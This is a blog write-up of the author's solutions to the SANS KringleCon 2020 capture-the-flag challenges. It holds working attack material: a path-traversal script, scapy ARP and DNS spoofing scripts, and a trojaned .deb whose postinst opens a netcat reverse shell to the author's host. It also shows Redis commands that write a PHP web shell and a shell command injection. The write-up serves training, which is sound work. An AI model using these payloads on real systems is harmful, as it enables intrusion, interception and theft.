---
title:  "SANS - Kringelcon 2020"
date:   2021-01-31
categories: [ctf]
tags: [ctf, sans, kringelcon]
---
## Introduction
Like every year, SANS provided a hacking challenge around christmas, the famous kringelcon. I really love this challenge and spent quite a bit of my spare time on it. The actual challenge can be found on https://2020.kringlecon.com/invite and as far as I know, it will stay online for a while, even when the offical challenge is closed and solutions can be disclosed now.

Altough I didn't finish the full challenge, I decided to push my solutions to my blog anyway. Well, this blogpost is less a write-up, its more just a bunch of steps to describe how I walked trough the solved challenges.

Huge respect and thanks to the people who designed, provided and maintained the challenge, it was excellent fun :-)  

![Logo](/images/kringelcon/intro.png)

## Objective 1 Uncover Santas Gift List
* download `Santas Bilboard`right beside the initial cabine
* open it in https://www.photopea.com/
* snap the twirled section with the lasso
* untwirl it
* `Proxmark`ist Josh Wrights gift



## Objective 2 Investigate S3-Bucket
* add wrapper3000 to the wordlist
* check with `./bucket_finder.rb wordlist` the buckets, wrapper3000 ist public
* download its content with `./bucket_finder.rb --download wordlist`
* with http://icyberchef.com/ and https://extract.me/de/, I could finaly extract the flag:
  * fromBase64 
  * Unzip 
  * bzip 
  * untar 
  * fromhexdump 
  * xz 
  * tar
  *  -> `North Pole: The Frostiest Place on Earth`



## Objective 3 Point-of-Sale Password Recovery
* Download the exe for local inspection
* Extract the exe with https://extract.me/de/, got a packed app-64.7z in the exe
* extracted app-64.7z again with https://extract.me/de/. Got a bunch of files in it
* The hint of sugarplum mary mentioned something from .asar, so lets stick to app.asar
* inspected app.asar with http://icyberchef.com/, found `const SANTA_PASSWORD = 'santapass';`



## Objective 4 Operate the Santavator
* no clue what I have done. played a bit around with the colleccted stuff, and bam, found :-)
* the goal is to split the electron in a way that all 3 connectors are electrified
  


## Objective 5 Open HID Lock
* we need the proxmark-reader
* Shyni upatree is carrying a card
* with `lf hid read` can we read the card

```bash
  [magicdust] pm3 --> lf hid read

  #db# TAG ID: 2006e22f13 (6025) - Format Len: 26 bit - FC: 113 - Card: 6025
  [magicdust] pm3 --> 
```

* after collecting the data, we have to walk next to the HID-Lock and execute `lf hid sim -r 2006e22f13`

```bash
  [magicdust] pm3 --> lf hid sim -r 2006e22f13
  [=] Simulating HID tag using raw 2006e22f13
  [=] Stopping simulation after 10 seconds.

  [=] Done
  [magicdust] pm3 --> 
```



## Objective 6 Splunk Challenge

### Training Questions
* 13
* t1059.003-main t1059.003-win
* HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography
* 2020-11-30T17:44:15Z
* 3648
* quser
* 55FCEEBB21270D9249E86F4B9DC7AA60

### Challenge Question
* 7FXjP1lyfKbyDK/MChyf36h7
* the hint is `It's encrypted with an old algorithm that uses a key. We don't care about RFC 7465 up here! I leave it to the elves to determine which one!`. This points to RC4
* The passphrase is in the video `Stay Frosty`
* solved with Cyberchef -> The Lollipop Guild


## Objective 7 Solve the Sleigh's CAN-D-BUS
* List all ID's and observe changes while playing with the controls 

```
  019#00000032      -> Steering full right (50)
  019#FFFFFFD0      -> Steering full left (-50)

  080#000032        -> Brake 50
  080#FFFFF8        -> Brake 50 / suspicios, comes irregularely
                    -> as soon as brakes are down t 3, the second line disapears

  02A#0000FF        -> Stop-Signal
  244#00000003ef    -> reaction to start, hex-value is changing and shows touring
  244#0000002372    -> max-value, about 9000 rpm

  19B#00000F000000  -> unlock
  19B#0000000F2057  -> lock / suspicios, comes irregularely
``` 
* Exclude ID080 with values containing FFFF
* Exclude ID19B with value #0000000F2057
* -> solved :-)



## Objective 8 Broken Tag Generator
There are multiple ways to achieve the challenge. RCE would be a nice one, the following is just the easiest for lazy guys ;-)
* https://tag-generator.kringlecastle.com/hh to provoce the error-output

```bash
Something went wrong!
Error in /app/lib/app.rb: Route not found
```
* curl https://tag-generator.kringlecastle.com/image?id=../app/lib/app.rb will fetch the sourcecode

```python
# encoding: ASCII-8BIT

TMP_FOLDER = '/tmp'
FINAL_FOLDER = '/tmp'

# Don't put the uploads in the application folder
Dir.chdir TMP_FOLDER

require 'rubygems'

require 'json'
require 'sinatra'
require 'sinatra/base'
require 'singlogger'
require 'securerandom'

require 'zip'
require 'sinatra/cookies'
require 'cgi'

require 'digest/sha1'

LOGGER = ::SingLogger.instance()

MAX_SIZE = 1024**2*5 # 5mb

# Manually escaping is annoying, but Sinatra is lightweight and doesn't have
# stuff like this built in :(
def h(html)
  CGI.escapeHTML html
end

def handle_zip(filename)
  LOGGER.debug("Processing #{ filename } as a zip")
  out_files = []

  Zip::File.open(filename) do |zip_file|
    # Handle entries one by one
    zip_file.each do |entry|
      LOGGER.debug("Extracting #{entry.name}")

      if entry.size > MAX_SIZE
        raise 'File too large when extracted'
      end

      if entry.name().end_with?('zip')
        raise 'Nested zip files are not supported!'
      end

      # I wonder what this will do? --Jack
      # if entry.name !~ /^[a-zA-Z0-9._-]+$/
      #   raise 'Invalid filename! Filenames may contain letters, numbers, period, underscore, and hyphen'
      # end

      # We want to extract into TMP_FOLDER
      out_file = "#{ TMP_FOLDER }/#{ entry.name }"

      # Extract to file or directory based on name in the archive
      entry.extract(out_file) {
        # If the file exists, simply overwrite
        true
      }

      # Process it
      out_files << process_file(out_file)
    end
  end

  return out_files
end

def handle_image(filename)
  out_filename = "#{ SecureRandom.uuid }#{File.extname(filename).downcase}"
  out_path = "#{ FINAL_FOLDER }/#{ out_filename }"

  # Resize and compress in the background
  Thread.new do
    if !system("convert -resize 800x600\\> -quality 75 '#{ filename }' '#{ out_path }'")
      LOGGER.error("Something went wrong with file conversion: #{ filename }")
    else
      LOGGER.debug("File successfully converted: #{ filename }")
    end
  end

  # Return just the filename - we can figure that out later
  return out_filename
end

def process_file(filename)
  out_files = []

  if filename.downcase.end_with?('zip')
    # Append the list returned by handle_zip
    out_files += handle_zip(filename)
  elsif filename.downcase.end_with?('jpg') || filename.downcase.end_with?('jpeg') || filename.downcase.end_with?('png')
    # Append the name returned by handle_image
    out_files << handle_image(filename)
  else
    raise "Unsupported file type: #{ filename }"
  end

  return out_files
end

def process_files(files)
  return files.map { |f| process_file(f) }.flatten()
end

module TagGenerator
  class Server < Sinatra::Base
    helpers Sinatra::Cookies

    def initialize(*args)
      super(*args)
    end

    configure do
      if(defined?(PARAMS))
        set :port, PARAMS[:port]
        set :bind, PARAMS[:host]
      end

      set :raise_errors, false
      set :show_exceptions, false
    end

    error do
      return 501, erb(:error, :locals => { message: "Error in #{ __FILE__ }: #{ h(env['sinatra.error'].message) }" })
    end

    not_found do
      return 404, erb(:error, :locals => { message: "Error in #{ __FILE__ }: Route not found" })
    end

    get '/' do
      erb(:index)
    end

    post '/upload' do
      images = []
      images += process_files(params['my_file'].map { |p| p['tempfile'].path })
      images.sort!()
      images.uniq!()

      content_type :json
      images.to_json
    end

    get '/clear' do
      cookies.delete(:images)

      redirect '/'
    end

    get '/image' do
      if !params['id']
        raise 'ID is missing!'
      end

      # Validation is boring! --Jack
      # if params['id'] !~ /^[a-zA-Z0-9._-]+$/
      #   return 400, 'Invalid id! id may contain letters, numbers, period, underscore, and hyphen'
      # end

      content_type 'image/jpeg'

      filename = "#{ FINAL_FOLDER }/#{ params['id'] }"

      if File.exists?(filename)
        return File.read(filename)
      else
        return 404, "Image not found!"
      end
    end

    get '/share' do
      if !params['id']
        raise 'ID is missing!'
      end

      filename = "#{ FINAL_FOLDER }/#{ params['id'] }.png"

      if File.exists?(filename)
        erb(:share, :locals => { id: params['id'] })
      else
        return 404, "Image not found!"
      end
    end

    post '/save' do
      payload = params
      payload = JSON.parse(request.body.read)

      data_url = payload['dataURL']
      png = Base64.decode64(data_url['data:image/png;base64,'.length .. -1])

      out_hash = Digest::SHA1.hexdigest png
      out_filename = "#{ out_hash }.png"
      out_path = "#{ FINAL_FOLDER }/#{ out_filename }"
      
      LOGGER.debug("output: #{out_path}")
      File.open(out_path, 'wb') { |f| f.write(png) }
      { id: out_hash }.to_json
    end
  end
end
```
* Finnaly, we are looking for a specific environment variable. `curl https://tag-generator.kringlecastle.com/image?id=../proc/<pid>/environ` would print the environmen variables in context of a process/pid. So, the following script did the job and got `GREETZ=JackFrostWasHere`

```python
import requests

for pid in range(10000):
    url = "https://tag-generator.kringlecastle.com/image?id=../proc/" + str(pid) + "/environ"
    res = requests.get(url)
    if(res.status_code == 200):
        print(pid)
        print(res.text)
        break
```

## O9 ARP Shenanigans
### Hints

`Jack Frost must have gotten malware on our host at 10.6.6.35 because we can no longer access it. Try sniffing the eth0 interface using tcpdump -nni eth0 to see if you can view any traffic from that host.`

`The host is performing an ARP request. Perhaps we could do a spoof to perform a machine-in-the-middle attack. I think we have some sample scapy traffic scripts that could help you in /home/guest/scripts.`

`Hmmm, looks like the host does a DNS request after you successfully do an ARP spoof. Let's return a DNS response resolving the request to our IP.`

`The malware on the host does an HTTP request for a .deb package. Maybe we can get command line access by sending it a command in a customized .deb file`

* so, the attack-chain looks like
1. Spoof the IP within the ARP-Response
2. Spoof the IP within the DNS-Response
3. Resolve the request to my own address
4. craft and provide via http a deb package so that it opens a reverse shell to my host
5. fetch the requestet file to solve the challenge


* fetch the ARP-Requests
  
```bash
guest@9573ea0dd8d1:~$ tcpdump -nni eth0
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
15:01:09.517331 ARP, Request who-has 10.6.6.53 tell 10.6.6.35, length 28
```
* modify the existing arp-spoofing-script

```python
#!/usr/bin/python3
from scapy.all import *
import netifaces as ni
import uuid

# Our eth0 ip
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
# Our eth0 mac address
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])

def handle_arp_packets(packet):
    
    if ARP in packet and packet[ARP].op == 1:
        ether_resp = Ether(dst=packet[Ether].src, type=0x806, src=macaddr)
        
        arp_response = ARP(pdst=packet[Ether].psrc)
        arp_response.op = 2
        arp_response.plen = 4
        arp_response.hwlen = 6
        arp_response.ptype =  0x0800 
        arp_response.hwtype = 0x1        
        arp_response.hwsrc = macaddr        
        arp_response.psrc = '10.6.6.53'
        arp_response.hwdst = packet[ARP].hwsrc
        arp_response.pdst = packet[ARP].psrc        
        response = ether_resp/arp_response        
        sendp(response, iface="eth0")
        

def main():
    # We only want arp requests
    berkeley_packet_filter = "(arp[6:2] = 1)"
    # sniffing for one packet that will be sent to a function, while storing none
    sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1)

if __name__ == "__main__":
    main()
```

* modify the existing dns-spoofing-script

```python
#!/usr/bin/python3
from scapy.all import *
import netifaces as ni
import uuid

# Our eth0 IP
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
# Our Mac Addr
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])

ipaddr_we_arp_spoofed = "10.6.6.53"

def handle_dns_request(packet):    
    eth = Ether(src=macaddr, dst=packet[Ether].src)                 
    ip  = IP(dst=packet[Ether][IP].src, src=ipaddr_we_arp_spoofed)    
    udp = UDP(dport=packet.sport, sport=53)                         
    dns = DNS(
        id        = packet[DNS].id,        
        qr        = 1,
        opcode    = packet[DNS].opcode,
        aa        = packet[DNS].aa,
        tc        = packet[DNS].tc,
        rd        = packet[DNS].rd,
        ra        = 1,
        z         = packet[DNS].z,
        ad        = packet[DNS].ad,
        cd        = packet[DNS].cd,
        rcode     = packet[DNS].rcode,
        qdcount   = packet[DNS].qdcount,
        ancount   = 1,
        nscount   = packet[DNS].nscount,
        arcount   = packet[DNS].arcount,
        qd        = DNSQR(
            qname = packet[DNS].qd.qname, 
            qtype = packet[DNS].qd.qtype, 
            qclass = packet[DNS].qd.qclass
        ),

        an        = DNSRR(
            rrname=packet[DNS].qd.qname,
            type=1,
            rclass=0x1,
            ttl=82159,
            rdlen=None,            
            rdata=ipaddr
        ),
        ns        = packet[DNS].ns,
        ar        = packet[DNS].ar
    )
    dns_response = eth / ip / udp / dns
    sendp(dns_response, iface="eth0")

def main():
    berkeley_packet_filter = " and ".join( [
        "udp dst port 53",                              # dns
        "udp[10] & 0x80 = 0",                           # dns request
        "dst host {}".format(ipaddr_we_arp_spoofed),    # destination ip we had spoofed (not our real ip)
        "ether dst host {}".format(macaddr)             # our macaddress since we spoofed the ip to our mac
    ] )
    
    sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface="eth0", count=100)

if __name__ == "__main__":
    main()
```

* prepare a crafted .deb-package

```bash
  mkdir package    
  cd package/    
  cp ../debs/netcat-traditional_1.10-41.1ubuntu1_amd64.deb .    
  dpkg -x netcat-traditional_1.10-41.1ubuntu1_amd64.deb work
  mkdir work/DEBIAN    
  ar -x netcat-traditional_1.10-41.1ubuntu1_amd64.deb
  tar -xf control.tar.xz ./control     
  tar -xf control.tar.xz ./postinst     
  mv control work/DEBIAN/           
  mv postinst work/DEBIAN/    
  echo "nc 10.6.0.2 4444 -e /bin/bash" >> work/DEBIAN/postinst   
  dpkg-deb --build work
  mv work.deb suriv_amd64.deb   
```

* prepare folder-structure for http-server and start the server in one tmux-tab

```bash
  mkdir pub/  
  mkdir pub/jfrost/   
  mkdir pub/jfrost/backdoor
  mv suriv_amd64.deb pub/jfrost/backdoor/
  python3 -m http.server 80
```

* open a listing netcat-instance in one tmux-tab

```bash
  nc -lp 4444 
```

* start dns_resp.py in one tmux-tab
* start arp_resp.py in one tmux-tab
* switch back to the tmux-tab where ncat is listing and `cat /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt`
* this leads to the info, that `Tanta Kringle` recused herself from the vote.


## Terminal Chalenges

### Unescape tmux
* connect to terminal
* `tmux ls` for listing actual sessions
* `tmux attach -t 0` to connect to the session
* done :-)

### Linux Primer
just printed out all the history which led me to the solution

```bash
  echo munchkin_9394554126440791
  ls ~
  find -name munchkin .
  ls -al
  cd ~/munchkin_19315479765589239
  cat munchkin_19315479765589239
  rm munchkin_19315479765589239
  pwd
  cat .bash_history
  cat .bashrc 
  cat /etc/environment 
  cd /usr/games
  printenv
  cd workshop/
  grep -i munchkin *.*
  chmod 777 lollipop_engine 
  ./lollipop_engine 
  cd /home/elf/workshop/electrical/
  ls
  mv blown_fuse0 fuse0
  ln -s fuse0 fuse1
  cp fuse1 fuse2
  echo MUNCHKIN_REPELLENT >> fuse2
  find /opt/munchkin_den/ -name munchkin
  cd /opt/munchkin_den/
  ls -R
  ps -aux
  netstat -ano
  curl http://localhost:54321
  kill 34510
```


### Sort o matic
* Matches at least one digit
  
`\d+`

* Matches 3 alpha a-z characters ignoring case
  
`[a-zA-Z]{3,}`

* Matches 2 chars of lowercase a-z or numbers
  
`[a-z\d]{2}`

* Any two characters that are not uppercase A-L or 1-5
  
`[^A-L1-5]{2}`

* Create a Regex To Match a String of 3 Characters in Length or More Composed of ONLY Digits
  
`^\d{3,}$`

* Create a regular expression that only matches if the entire string is a valid Hour, Minute and Seconds time format 

`^(([0-1][0-9]|[2][0-3])|[1-9]):([0-5][0-9]):([0-5][0-9])$`

* Create A Regular Expression That Matches The MAC Address Format Only While Ignoring Case

`^([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})$`

* Create A Regex That Matches Multiple Day, Month, and Year Date Formats Only
  
`^(0[1-9]|[12][0-9]|3[01])[- /.](0[1-9]|1[012])[- /.](\d\d\d\d)$`



### Kringle Kiosk
* Option 4 is vulnerable to command/code injection. To achieve this, symply enter  `; /bin/bash ;` Following code gets broken by the injection

```bash
#!/bin/bash

declare -x LAST_ORDER
LAST_ORDER=''

# https://bash.cyberciti.biz/guide/Menu_driven_scripts
# A menu driven shell script sample template
## ----------------------------------
# Step #1: Define variables
# ----------------------------------
RED='\033[0;41;30m'
STD='\033[0;0;39m'

# ----------------------------------
# Step #2: User defined function
# ----------------------------------
pause() {
  read -r -p "Press [Enter] key to continue..." fackEnterKey
}

one() {
  cat /opt/castlemap.txt
  pause
}

two() {
  more /opt/coc.md
  pause
}


three() {
  cat /opt/directory.txt
  pause
}

four() {
  read -r -p "Enter your name (Please avoid special characters, they cause some weird errors)..." name
  if [ -z "$name" ]; then
    name="Santa\'s Little Helper"
  fi
  bash -c "/usr/games/cowsay -f /opt/reindeer.cow $name"
  pause
}

surprise(){
  cat /opt/plant.txt
  echo "Sleeping for 10 seconds.." && sleep 10
}

# function to display menus
show_menus() {
  clear
  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo " Welcome to the North Pole!"
  echo "Sleeping for 10 seconds.." && sleep 10
  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
  echo "1. Map"
  echo "2. Code of Conduct and Terms of Use"
  echo "3. Directory"
  echo "4. Print Name Badge"
  echo "5. Exit"
  echo
  echo
  echo "Please select an item from the menu by entering a single number."
  echo "Anything else might have ... unintended consequences."
  echo
}
# read input from the keyboard and take a action
read_options() {
  local choice
  read -r -p "Enter choice [1 - 5] " choice
  case $choice in
  1*) one ;;
  2*) two ;;
  3*) three ;;
  4*) four $choice ;;
  5) exit 0 ;;
  plant) surprise c;;
  *) echo -e "${RED}Error...${STD}" && sleep 2 ;;
  esac
}
# ----------------------------------------------
# Step #3: Trap CTRL+C, CTRL+Z and quit singles
# ----------------------------------------------
trap '' SIGINT SIGQUIT SIGTSTP
# -----------------------------------
# Step #4: Show opening message once
# ------------------------------------
echo
echo Welcome to our castle, we\'re so glad to have you with us!
echo Come and browse the kiosk\; though our app\'s a bit suspicious.
echo Poke around, try running bash, please try to come discover,
echo Need our devs who made our app pull/patch to help recover?
echo
echo "Escape the menu by launching /bin/bash"
echo
echo
read -n 1 -r -s -p $'Press enter to continue...'
clear
# -----------------------------------
# Step #5: Main logic - infinite loop
# ------------------------------------
while true; do
  show_menus
  read_options
done
```


### Speaker Open Door/Lights/VendingMachines
### Door
* extract the human readable strings with `strings ./door`
* found the line `Be sure to finish the challenge in prod: And don't forget, the password is "Op3nTheD00r"`

### Lights
* with ./lights, just copy the encrypted pw to the username in the config-file. the programm will encode it when starting and print it out as "username"

### Vendingmachine
* vendingmachine was a bit harder to solve, here, I had to script
* following the hints, I started to let the programm create the vendingmachine.json
* Inspect the cipher of passphrase `aaaaaaaaaaaaaaaaaa`, the key has to be 8
* solve the challenge with following script

```python
# generates a string containing 8 chars of each char in the alphanumeric alphabet, recreate a vendingmachine.json with that to get
# the fully encrypted alphabet
def create_alphabet():
    alphabet="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"   
    liste=[]
    charseq=''

    for c in alphabet:
        for x in range(8):
            
            charseq += c
        
        liste.append(charseq)
        charseq = ''
   
    return liste

# generates a dictionary with the encrypted representation of each char in the alphabet as key and the char as value
def create_map(liste):
    encrypted_alphabet="9VbtacpgGUVBfWhPe9ee6EERORLdlwWbwcZQAYue8wIUrf5xkyYSPafTnnUgokAhM0sw4eOCa8okTqy1o63i07r9fm6W7siFqMvusRQJbhE62XDBRjf2h24c1zM5H8XLYfX8vxPy5NAyqmsuA5PnWSbDcZRCdgTNCujcw9NmuGWzmnRAT7OlJK2X7D7acF1EiL5JQAMUUarKCTZaXiGRehmwDqTpKv7fLbn3UP9Wyv09iu8Qhxkr3zCnHYNNLCeOSFJGRBvYPBubpHYVzka18jGrEA24nILqF14D1GnMQKdxFbK363iZBrdjZE8IMJ3ZxlQsZ4Uisdwjup68mSyVX10sI2SHIMBo4gC7VyoGNp9Tg0akvHBEkVH5t4cXy3VpBslfGtSz0PHMxOl0rQKqjDq2KtqoNicv2rDO5LkIpWFLz5zSWJ1YbNtlgophDlgKdTzAYdIdjOx0OoJ6JItvtUjtVXmFSQw4lCgPE6x73ehm9ZFH"
    map={}    
    pos=0

    for value in liste:
        key = encrypted_alphabet[pos:pos+8]
        map.update({key:value[0]})
        
        pos+=8

    return map


def decode_passphrase(map, cipher):
    password=''

    for index in range(len(cipher)):
        for key in map:
            if cipher[index] == key[index]:
                password += map[key]
    
    return password


def main():
    liste = create_alphabet()
    map = create_map(liste)
    password = decode_passphrase(map, "LVEdQPpB")
    password += decode_passphrase(map, "wr")

    print(password)

if __name__ == "__main__":
    
    main()

```

### 33.6 Kbps
* check the javascript-code `dialup.js`
* the thing is, there has to be entered `7568347` and afterwards the right combination of sounds to build the correct secret
* the combination can be guessed by reading the code for example the sequence following after line 131:

```javascript
  btnrespCrEsCl.addEventListener('click', () => {
    if (phase === 3) {
      phase = 4;
      playPhase();
      secret += '3j2jc'
    } else {
      phase = 0;
      playPhase();
    }
    sfx.resp_cr_es_cl.play();
  });
```
* this handler gets triggered when `baa Dee brrr` is clicked on the paper-sheet. So, this click has to be done once the code states in phase 3.
* Add breakpoints where you need to stop, so that there is enough time to get prepared for the right click-sequence
* and so on and so on ....
* once completed, the server-request will return the following object:
```json
  {
    type: "COMPLETE_CHALLENGE", 
    resourceId: "6f6b58d6-8b7d-41f5-9a88-258574943dfd", 
    hash: "1d13520aa9286e49553d0f6dd9a1455eeef412f70788f710feb6f8b66a9dae31", 
    action: undefined
  }
```

### Redis
* there can be interacted with a redis-db via curl and a maintenance-page.
* the goal is to access/read/download index.php
* proceeded as in https://book.hacktricks.xyz/pentesting/6379-pentesting-redis described

```bash
  curl http://localhost/maintenance.php?cmd=config,set,dir,'/var/www/html'

  curl http://localhost/maintenance.php?cmd=CONFIG,SET,dbfilename,sh.php    

  # check if rce works   curl http://localhost/maintenance.php?cmd=SET,TEST,<?php phpinfo(); ?>  
  # payload hast to be url-encoded
  curl http://localhost/maintenance.php?cmd=SET,TEST,%3C%3Fphp%20phpinfo%28%29%3B%20%3F%3E%20      
      
  # payload to access index.php <?php echo file_get_contents( "index.php" ); ?>  
  curl http://localhost/maintenance.php?cmd=SET,TEST,%3C%3Fphp%20echo%20file_get_contents%28%20%22index.php%22%20%29%3B%20%3F%3E%20

  curl http://localhost/maintenance.php?cmd=SAVE

```

### Can-Bus
* `cat candump.log | grep -v 244`to filter to the relevant lines
* `./runtoanswer 122520`
* baamm, that's it


### Scappy Prepper
* task.submit('start')                       
* task.submit(send)                          
* task.submit(sniff)                         
* task.submit(1)                             
* task.submit(rdpcap)                        
* task.submit(2)                             
* task.submit(UDP_PACKETS[0])                
* task.submit(TCP_PACKETS[1][TCP])           
* UDP_PACKETS[0][IP].src = "127.0.0.1"       
* task.submit(UDP_PACKETS[0])                
* TCP_PACKETS[3][Raw].load                   
* task.submit('echo')                        
* ICMP_PACKETS[1][ICMP].chksum               
* task.submit(19524)                         
* task.submit(3)                             
* pkt = IP(dst='127.127.127.127')/UDP(dport=5000)
* task.submit(pkt)                           
* pkt = IP(dst='127.2.3.4')/UDP(dport=53)/DNS(qd=DNSQR(qname="elveslove.santa"))
* task.submit(pkt)   
* ARP_PACKETS[1][Ether].src     -> Get the unknown mac-address                
* ARP_PACKETS[1][ARP].op = 2                 
* ARP_PACKETS[1][ARP].hwsrc = '00:13:46:0b:22:ba'
* ARP_PACKETS[1][ARP].hwdst = '00:16:ce:6e:8b:24'
* task.submit(ARP_PACKETS)    

